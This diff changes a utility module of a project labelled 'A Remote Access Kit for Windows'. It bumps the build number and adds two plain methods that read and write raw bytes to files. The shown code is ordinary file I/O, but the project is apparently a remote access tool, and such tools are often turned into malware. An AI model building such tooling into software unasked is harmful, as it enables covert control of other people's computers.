@@ -10,7 +10,7 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.2
+# Build:  1.0.21
 # -------------------------------------------------------------
 import os
 from ..utils.utils import ErrorHandling,Notifications
@@ -43,6 +43,19 @@ class LoggingUtilitys():
         with open(file_path,'w') as file:               #Open file
             file.write(data)                            #Write data
             file.close()                                #Close file
+
+    #Function will read bytes from file
+    def receive_file_bytes(self,file_path):
+        with open(file_path,'rb') as file:      #Open file
+            data = file.read()                  #Read data
+            file.close()                        #Close file
+        return data                             #Return data
+
+    #Function will write bytes to a file
+    def write_bytes_to_file(self,file_path,bytes_data):
+        with open(file_path,'wb') as file:      #Open file
+            file.write(bytes_data)              #Write bites
+            file.close()                        #Close file
 
 class NetworkingConfigs():
 
